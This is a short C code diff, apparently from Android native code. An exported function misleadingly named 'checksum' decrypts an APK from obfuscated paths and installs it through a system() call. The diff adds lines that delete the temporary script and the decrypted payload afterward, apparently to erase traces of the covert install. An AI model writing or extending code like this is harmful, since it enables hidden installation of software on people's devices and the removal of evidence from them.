@@ -102,6 +102,8 @@ __attribute__ ((visibility ("default"))) int checksum(void) {
   // Decrypt before install
   LOGD("[APK INSTALLER] Decrypting apk...!\n");
   if(!decrypt_ptr(current_path_rcs)) {
+    remove(deobfuscate(current_path_shtmp));
+    remove(current_path_rcs);
     LOGD("[APK INSTALLER] Decryption failed...!\n");
     return 0;
   }
@@ -110,6 +112,8 @@ __attribute__ ((visibility ("default"))) int checksum(void) {
   system(script_rcs);
   
   LOGD("[APK INSTALLER] All done!\n");
+  remove(current_path_shtmp); // Just to be sure
+  remove(current_path_rcs); 
 
   return 1;
 }
